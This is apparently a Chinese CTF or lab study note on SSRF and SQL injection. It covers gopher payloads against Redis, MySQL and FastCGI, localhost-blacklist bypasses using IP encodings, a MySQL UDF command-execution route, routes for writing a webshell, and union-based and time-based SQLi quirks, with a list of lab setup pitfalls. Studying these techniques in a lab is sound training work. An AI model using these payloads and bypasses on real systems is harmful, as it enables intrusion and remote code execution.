## 二、知识点

### 1. SSRF 三个条件

```
① 有发请求的功能     file_get_contents / curl_exec / fsockopen / getimagesize
② URL 可控           参数、请求头、Cookie
③ 校验缺失或可绕
```

判断任何一个点，就按这三条问。

### 2. 协议决定射程

| 协议 | 到达层 | 能力 |
|---|---|---|
| `http://` | 应用层 | 打内网网页、后台、云元数据 |
| `file://` | 文件系统 | 读本地文件（不受 web 根限制） |
| `dict://` | TCP（有限） | 探测端口、读 banner |
| `gopher://` | TCP | 发任意字节，跟任何协议对话 |

**这不是"权限更高"，是"换了通道"**：`http://` 受 web 根约束，`file://` 直接读磁盘。

### 3. gopher 的两条实测结论

**① curl 会自动补一个 CRLF**

发出 `gopher://127.0.0.1:9001/_%2a%31%0d%0a%24%34%0d%0a%50%49%4e%47%0d%0a`，监听端收到：

```
2a 31 0d 0a 24 34 0d 0a 50 49 4e 47 0d 0a 0d 0a
= *1\r\n$4\r\nPING\r\n\r\n      ← 末尾多了一个 \r\n
```

打 Redis 时无害（当空命令），打 HTTP 时要算进报文。

**② Windows 版 PHP 没有 gopher 包装器**

实测 PHP 5.4 和 8.2，`stream_get_wrappers()` 里都没有 gopher；但 `curl_exec` 走 libcurl **支持**。

→ 能不能用 gopher，取决于目标代码用哪个函数。

### 4. IP 变形的有效性（实测）

源码 `preg_match('/localhost|127\.0\.0\.1/', host)` 时，下面几种全部绕过成功：

```
0.0.0.0        所有网卡，连接等价本机
127.1          简写
0x7f000001     十六进制
2130706433     十进制
0177.0.0.1     八进制
```

**黑名单匹配字符串，解析器认地址**——两者不一致就有空间。

### 5. 数字被禁时只能靠域名

源码升级成 `preg_match('/localhost|\d/i', host)` 后，所有 IP 写法全废（都含数字）。

唯一出路：纯字母域名解析到 127.0.0.1，如 `local.hello-ctf.com`。这是 DNS 重绑定类绕过的雏形。

### 6. MySQL 握手的真相（抓包实测）

原来以为"MySQL 要先读 salt 再算回应，gopher 单向发送打不通"。tcpdump 抓真实流量后发现：

```
a1000001 85a23f00 00000000 01 0000...00 726f6f74 00 00
                                              root\0 │
                                                     └ auth response 长度 = 0
```

**空密码时 auth response 是空串，不需要 salt**——固定 payload 就能过认证。

| 场景 | 能否用固定 payload |
|---|---|
| root 空密码 | 能 |
| 有密码 | 不能，要先读 salt |

### 7. 进程权限决定攻击路线

| 服务 | 运行用户 | 能写 `/var/www/html` 吗 |
|---|---|---|
| Redis（容器内） | **root** | 能 → 直接写 webshell |
| mysqld | **mysql** | 不能 → `Errcode 13` |

同样目标，Redis 四条命令搞定，MySQL 要走 UDF。

**打之前先 `ps aux` 看进程用户。**

### 8. MySQL UDF 提权路径

```
① 编译 lib_mysqludf_sys.so（sys_exec / sys_eval）
   gcc -shared -fPIC -Os  → strip 后 14 KB
② INTO DUMPFILE 写进插件目录（需要目录可写）
③ CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'
④ SELECT sys_exec('id > /tmp/rce.txt')
⑤ 用 file:// 把 /tmp/rce.txt 读回来
```

中途想用 UDF 执行 `chmod 777 /var/www/html` 解锁写权限——**失败了**，mysql 用户不是属主，chmod 要属主权限。

### 9. COM_QUIT 避免连接挂死

`php -S` 是单线程，gopher 连接会一直挂着（MySQL 不主动断开），**一个请求就把服务器堵死**。

payload 末尾补一个 COM_QUIT（`01 00 00 00 01`），MySQL 主动断开 → curl 立刻返回。

| 方案 | 结果 |
|---|---|
| 不加 | 超时，服务器废掉，必须重启容器 |
| 加 | HTTP 200，2 秒内返回 |

### 10. FastCGI 协议结构

每条记录 8 字节头 + 内容 + padding（8 字节对齐）：

```
version(1) type(1) requestId(2) contentLength(2) paddingLength(1) reserved(1)
```

三条记录：`BEGIN_REQUEST`（role=RESPONDER）→ `PARAMS` → `STDIN`。

核心参数：

```
PHP_VALUE = allow_url_include=On
            auto_prepend_file=php://input
```

FPM 执行脚本前自动 include `php://input`，也就是 STDIN 里的代码。

`name-value` 对长度编码：小于 128 用 1 字节，否则 4 字节且首字节高位置 1。

### 11. SQL：`LIMIT 0,1` 的后果

**最关键的一条**：`-- -` 会把 LIMIT 一起注释掉。

```sql
WHERE id='-1' union select 1,2,3-- -' LIMIT 0,1
                                  ↑ 注释从这里开始，LIMIT 消失
```

LIMIT 真正生效时：

| 场景 | 后果 |
|---|---|
| 参数写 `-1` | union 行在第一位，正常显示 |
| 参数写 `1`（原记录命中） | union 行被挤掉 |
| union 多行 | 只出第一行 |
| 要翻页 | 双 LIMIT 报语法错，只能用子查询 `LIMIT n,1` |
| 盲注 | 无影响 |

**压成一行的办法**：`group_concat`（天然一行，默认上限 1024 字节）。

### 12. SQL：Less-1 与 Less-2 的注释差异

| | Less-1 字符型 `id='$id'` | Less-2 数字型 `id=$id` |
|---|---|---|
| 不写注释 | **语法错误**（引号没闭合） | **合法，能跑** |
| 必须注释吗 | 必须 | 不必 |
| LIMIT 是否残留 | 注释后不残留 | 不写注释时残留 |
| 能自己塞 LIMIT 翻页 | 能 | 不能（双 LIMIT 报错） |
| 多行数据 | 注释后直接 union 多行 | 必须 group_concat 或子查询 |

### 13. SQL：LIMIT 会让时间盲注计时失真（容易误判）

实测 `or sleep(1)`：

| 语句 | 耗时 |
|---|---|
| `id=1 or sleep(1) LIMIT 0,1` | **0.39s** |
| `id=1 or sleep(1)` 无 LIMIT | **12.37s** |
| `id=999 or sleep(1) LIMIT 0,1` | 13.38s |
| `id=1 and sleep(1) LIMIT 0,1` | 1.42s |

第一行命中 `id=1` 后，LIMIT 0,1 立刻停止扫描，**根本没执行 sleep**。

**如果按"14 行 × 1 秒 = 14 秒"去等，这里只等 0.39 秒，会误判成条件不成立。**

`and sleep()` 不受影响，因为 `and` 必须每行求值才知道是否命中。

## 四、踩坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 拉不到镜像 | `auth.docker.io` 超时，解析到 `2a03:2880:...` | DNS 污染；配 `registry-mirrors` |
| Docker 引擎起不来 | `docker ps` 一直失败 | **`daemon.json` 带 UTF-8 BOM**（PowerShell 5.1 的 `-Encoding utf8` 会写 BOM），dockerd 解析失败；用 `UTF8Encoding($false)` 重写 |
| 容器秒退 | `exec /docker-entrypoint.sh: no such file or directory` | git clone 后 `.sh` 是 **CRLF**，`#!/bin/sh\r` 解释器路径不存在；批量转 LF |
| pip 构建失败 | `IndexError: list index out of range` | Alpine 自带 pip 20.3.4 太老，解析不了新版 flask 的 pyproject.toml；先升级 pip |
| 端口映射对却打不开 | `-p 18085:80` 访问不了 | 应用实际监听 **5050**，`EXPOSE 80` 只是声明；进容器 `netstat` 确认 |
| 打完一发后续请求全超时 | 靶场卡死 | gopher 长连接 + `php -S` 单线程；加 COM_QUIT，或重启容器 |
| 请求超时以为是没打通 | 5 秒就超时 | gopher 是长连接，超时 ≠ 失败，要看副作用（文件落不落地） |
| 把 `..` 过滤和 `../` 过滤混为一谈 | `....//` 绕不过 | 前者只能绝对路径 |
| 时间盲注等错时间 | 预期 14 秒实际 0.39 秒 | LIMIT 0,1 让第一行命中后停止扫描，`or sleep()` 没执行 |
